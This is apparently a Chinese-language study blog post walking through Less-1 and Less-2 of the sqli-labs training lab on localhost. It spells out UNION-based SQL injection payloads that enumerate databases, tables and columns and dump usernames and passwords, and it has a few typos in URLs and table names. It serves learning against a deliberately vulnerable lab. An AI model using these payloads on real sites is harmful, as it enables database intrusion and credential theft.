---
title: sqli-labs
date: 2019-07-16 14:28:06
categories: sql injection
---
这个篇博客记录一下学习mysql-injection的过程
项目地址： https://github.com/Audi-1/sqli-labs
<!--more-->
## Less-1
- 登陆"127.0.0.1/sqli-labs-master/Less-1/?id=1"
![1-1](sqli-labs/1-1.png)
- 而在链接之后直接添加'
效果如图
![1-2](sqli-labs/1-2.png)
经过sql语句构造后形成'1''LIMIT 0,1错误
此时查询结果为字符型select username,password  from users where id='$_GET[id]' limit 0,1
- 进入"127.0.0.1/sqli-labs-master/Less-1/?id=1'or 1=1- -+"
![1-3](sqli-labs/1-3.png)
此时的sql语句成为SElECT * where id='1'or 1=1--+ LIMIT 0,1并正常返回数据
- 使用orderby语句，进入"127.0.0.1/sqli-labs-master/Less-5/?id=1'order by 3 - -+"
![1-4](sqli-labs/1-4.png)
而进入"127.0.0.1/sqli-labs-master/Less-1/?id=1'order by 4 - -+"
![1-5](sqli-labs/1-5.png)
说明一共有三列数据，输入4结果会超出
- 爆数据库名操作，进入"127.0.0.1/sqli-labs-master/Less-1/?id=-1'union select 1, (select group_concat(schema_name)  from information_schema.schemata) , 3  - -+"
此时sql语句成为SELECT * FROM users WHERE id='-1'union select 1,group_concat(schema_name),3 from information_schema.schemata- -+ LIMIT0,1
其中UNION操作符用于合并两个或多个SELECT语句的结果集
![1-6](sqli-labs/1-6.png)
- 爆security下所有表名 进入"127.0.0.1/sqli-labs-master/Less-1/?id=-1'union select 1, (select group_concat(table_name)  from information_schema.tables where table_schema = 'security') , 3  - -+"
此时sql语句为为SELECT * FROM users WHERE id='-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'- -+ LIMIT0,1
![1-7](sqli-labs/1-7.png)
- 爆user表的列 进入"127.0.0.1/sqli-labs-master/Less-1/?id=-1'union select 1, (select group_concat(column_name)  from information_schema.columns where table_name = 'user') , 3  - -+"
此时sql语句为SELECT * FROM users WHERE id='-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'- -+ LIMIT0,1
![1-8](sqli-labs/1-8.png)
- 爆用户名与密码 进入"127.0.0.1/sqli-labs-master/Less-1/?id=-1'union select 1,username,password from users where id=2- -+"
此时sql语句为SELECT * FROM users WHERE id='-1'union select 1,username,password from users where id=2- -+ LIMIT0,1
![1-9](sqli-labs/1-9.png)
## Less-2
- 进入"127.0.0.1/sqli-lavs-master/Less-2"
![2-1](sqli-labs/2-1.png)
- 根据提示传入numeric参数id
![2-2](sqli-labs/2-2.png)
- 加入单引号进行测试
![2-3](sqli-labs/2-3.png)
看到错误check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
- 采用注释方法闭合单引号
![2-4](sqli-labs/2-4.png)
还是出现错误，可以与LESS1对比想到这是一个数字型而不是字符型注入，发送的SQL语句是select * from users where id=$_GET[id]（举例）
- 除去单引号
![2-5](sqli-labs/2-5.png)
- 猜字段长度
![2-6](sqli-labs/2-6.png)
![2-7](sqli-labs/2-7.png)
字段长度为3
- 爆数据库，127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1, (select group_concat(schema_name) from information_schema.schemata) , 3 --+
![2-8](sqli-labs/2-8.png)
- 爆表名，1277.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema = 'security') , 3 - -+
![2-9](sqli-labs/2-9.png)
- 爆字段名，127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1, (select group_concat(column_name) from information_schema.columns where table_name = 'users') , 3 --+
![2-10](sqli-labs/2-10.png)
- 爆字段内容，127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1, username,password from users where id=2 --+
![2-11](sqli-labs/2-11.png)
## Less-3
